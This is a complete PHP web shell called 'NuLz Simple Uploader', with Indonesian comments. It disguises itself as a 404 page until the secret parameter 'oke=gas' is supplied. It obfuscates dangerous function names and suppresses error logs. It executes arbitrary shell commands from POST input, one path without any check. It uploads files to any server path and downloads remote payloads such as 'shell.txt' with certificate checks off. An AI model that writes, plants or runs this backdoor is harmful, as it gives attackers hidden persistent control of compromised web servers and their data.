<?php
set_time_limit(0);
error_reporting(0);
@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
header("X-XSS-Protection: 0");
function NotFound() {
    header("HTTP/1.0 404 Not Found");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>'.$_SERVER["SERVER_SOFTWARE"].' Server at '.$_SERVER["HTTP_HOST"].'</address>
    </body></html>
    ';
    }
function CreateFile($file_name, $file_content)
{
    if (function_exists('file_put_contents')) {
        return file_put_contents($file_name, $file_content) !== false;
    }

    if (function_exists('fopen')) {
        $file = fopen($file_name, 'w');
        if (!$file) return false; // Jika fopen gagal

        if (fwrite($file, $file_content) === false) { 
            fclose($file);
            return false;
        }
        
        fclose($file);
        return true;
    }

    return false;
}
function NuLzFetch($url)
{
    if (function_exists('file_get_contents')) {
        $result = @file_get_contents($url);
        if ($result !== false) {
            return $result;
        }
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $result = curl_exec($ch);
        curl_close($ch);
        
        return $result ?: false;
    }

    return false;
}
function NuLzCmd($komendnya)
{
    $hayoloh = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
    $fw = 'f' . 'wr' . 'it' . 'e';
    $fc = 'f' . 'cl' . 'os' . 'e';
    $fr = 'f' . 're' . 'a' . 'd';
    $is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
    $sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
    $proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
    $proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
    $pop = 'p' . 'ope' . 'n';
    $pop_cls = 'pc' . 'lose';
    $exc = 'e' . 'x' . 'ec';
    $sys = 's' . 'ys' . 't' . 'em';
    $pass = 'pa' . 's' . 'sth' . 'ru';
    $sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
    $com = 'C' . 'O' . 'M';
    $wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
    $cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
    $preg = 'pr' . 'eg_' . 'mat' . 'ch';
    $regex = '2' . '>' . '&' . '1';
    if (!$preg('/' . $regex . '/i', $komendnya)) {
        $komendnya = $komendnya . ' ' . $regex;
    }

    if ($func_exist($proc)) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $process = $proc($komendnya, $descriptors, $pipes);
        if ($is_rsrc($process)) {
            $fw($pipes[0], 'input_data_here');
            $fc($pipes[0]);
            $output = $sgc($pipes[1]);
            $errors = $sgc($pipes[2]);
            $fc($pipes[1]);
            $fc($pipes[2]);
            $resultCode = $proc_cls($process);
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ($func_exist($pop)) {
        $process = $pop($komendnya, 'r');
        $read = $fr($process, 2096);
        return trim($hayoloh(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
        $pop_cls($process);
    } elseif ($func_exist($exc)) {
        $exc($komendnya, $output, $returnCode);
        if ($returnCode === 0) {
            $res = implode($output);
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ($func_exist($sys)) {
        $out = $sys($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($pass)) {
        $out = $pass($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($sh_exc)) {
        $out = $sh_exc($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($com)) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c " . $komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    } else {
        return "The Function To Run The Command Is Disable On This Serever";
    }
}

function NuLzUploadFile($this_file, $location)
{
    $uploadFunction = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
    $cp = 'copy';
    if (function_exists($uploadFunction)) {
        if (@$uploadFunction($this_file, $location)) {
            return true;
        } else {
            return false;
        }
    } elseif (function_exists($cp)) {
        if (@$cp($this_file, $location)) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}
//upload 2
if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    try {
        switch ($_POST['action']) {
            case 'uploadDua':
                if (!empty($_FILES['file'])) {
                    $target = $_POST['path']; // Ambil path dari request

                    if (!is_dir($target)) {
                        throw new Exception("Folder tujuan tidak ditemukan: $target");
                    }

                    $uploadedFiles = [];
                    foreach ($_FILES['file']['tmp_name'] as $index => $tmpName) {
                        $fileName = basename($_FILES['file']['name'][$index]);
                        $targetFilePath = rtrim($target, '/') . '/' . $fileName;

                        if (move_uploaded_file($tmpName, $targetFilePath)) {
                            $uploadedFiles[] = $fileName;
                        } else {
                            throw new Exception("Gagal mengunggah file: $fileName");
                        }
                    }

                    // Tambahkan log respons
                    $response = json_encode([
                        'status' => 'success',
                        'uploaded_files' => $uploadedFiles
                    ]);

                    error_log("Response JSON: " . $response); // Simpan di error log server
                    echo $response;
                } else {
                    throw new Exception("Tidak ada file yang dikirim");
                }
                break;
        }
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    exit;
}

if (isset($_POST['cmd'])) {
    $komendnya = $_POST['cmd'];
    echo NuLzCmd($komendnya);
}
function ThisCWD()
{
    if (function_exists('getcwd')) {
        return @getcwd();
    } else {
        return dirname($_SERVER["SCRIPT_FILENAME"]);
    }
}
$path = ThisCWD();
$path = str_replace("\\", "/", $path);
$param_name = 'oke';
$key = 'gas';
$param = isset($_GET[$param_name]) ? $_GET[$param_name] : '';
if ($param === $key) {
    echo '<span style="white-space: nowrap;">Name: <pre style="display: inline;white-space: pre-wrap;">NuLz Simple Uploader</pre></span>';
    echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
    echo '
            <form action="" method="POST" enctype="multipart/form-data">
                <b>Method 1</b><br>
                <label for="upload_path">Lokasi Tujuan:</label>
                <input type="text" style="width: 30vh;" name="upload_path" id="upload_path" value="' . $path . '"><br>
                <input type="file" name="file[]" id="file" multiple><br>
                <button type="submit" name="uploads">Upload</button>
                ';
    if (isset($_POST['uploads'])) {
        if (isset($_FILES["file"])) {
            $countFiles = count($_FILES["file"]["name"]);
            for ($i = 0; $i < $countFiles; $i++) {
                $fi_le_Na_me = $_FILES["file"]["name"][$i];
                $location = $_POST['upload_path'] . "/" . $fi_le_Na_me;
                $uploadFunction = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
                if (NuLzUploadFile($_FILES["file"]["tmp_name"][$i], $location)) {
                    echo "<span style='background: #222222; color: #00ff00; padding: 5px; border-radius: 10px;'>Upload Success</span>";
                } else {
                    echo "<span style='background: #222222; color: #ff0000; padding: 5px; border-radius: 10px;'>Upload Failed</span>";
                }
            }
        } else {
            echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
        }
    }
    echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
    echo '
        <b>Method 2</b><br>
        <label for="upload_path_dua">Lokasi Tujuan:</label>
        <input type="text" style="width: 30vh;" name="upload_path_dua" id="upload_path_dua" value="' . $path . '"><br>
        <input type="file" name="filedua[]" id="filedua" multiple><br>
        <button type="button" onclick="uploadFileDua()">Upload</button>
    ';
    echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
    echo '
                <b>Remote Upload</b><br>
                <label for="fileurl">URL:</label>
                <input type="text" style="width: 30vh;" name="fileurl" id="fileurl" placeholder="https://nulz.edu.gov.ac.id/shell.txt"><br>
                <label for="savename">SAVE AS:</label>
                <input type="text" style="width: 30vh;" name="savename" id="savename" value="' . $path . '/saved.txt"><br>
                <button type="submit" name="remoteup">Save</button>
            ';
    if (isset($_POST['remoteup'])) {
        if (!empty($_POST['fileurl']) && !empty($_POST['savename'])) {
            $fileurl = $_POST['fileurl'];
            $saveas = $_POST['savename'];
            $filecontent = NuLzFetch($fileurl);

            if ($filecontent !== false) {
                if (CreateFile($saveas, $filecontent)) {
                    echo "<span style='background: #222222; color: #00ff00; padding: 5px; border-radius: 10px;'>Remote Upload Success</span>";
                } else {
                    echo "<span style='background: #222222; color: #ff0000; padding: 5px; border-radius: 10px;'>Remote Upload Failed</span>";
                }
            } else {
                echo "<span style='background: #222222; color: #ffe100; padding: 5px; border-radius: 10px;'>Warning: Your input URL is not valid, please enter a valid URL</span>";
            }
        } else {
            echo "<span style='background: #222222; color: #ffe100; padding: 5px; border-radius: 10px;'>Warning: The input URL is empty, please input your URL</span>";
        }
    }
    echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
    echo '
                <b>Commands</b><br>
                <label for="cmds">$</label>
                <input type="text" style="width: 40vh;" name="cmds" id="cmds" autofocus placeholder="ls -la"><br>
            ';
    echo '<textarea style="font-size: 10px; width: 40vh; height: 300px;">';
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $komendnya = $_POST['cmds'];
        echo NuLzCmd($komendnya);
    }
    echo '</textarea>';
    echo '</form>';
    echo '<script>
    function uploadFileDua() {
        const fileInput = document.getElementById("filedua");
        const currentPath = document.getElementById("upload_path_dua").value;
        const file = fileInput.files;
        if (!file) return;
        const formData = new FormData();
        formData.append("action", "uploadDua");
        formData.append("path", currentPath);
        for (let i = 0; i < file.length; i++) {
            formData.append("file[]", file[i]);
        }
        fetch("", { method: "POST", body: formData })
            .then(response => response.text())
            .then(text => {
                console.log("Response Text:", text);
                try {
                    return JSON.parse(text);
                } catch (error) {
                    throw new Error("Response is not valid JSON: " + text);
                }
            })
            .then(response => {
                if (response.status === "success") {
                    alert("Upload Success :) With Method 2");
                    fileInput.value = "";
                } else {
                    alert("Upload Failed :( With Method 2");
                }
            })
            .catch(err => {
                document.body.innerHTML += `<span style="color: #fcf803;">Terjadi kesalahan saat mengupload</span>`;
                console.error("Error:", err);
            });
    }
    </script>';
} else {
    NotFound();
}
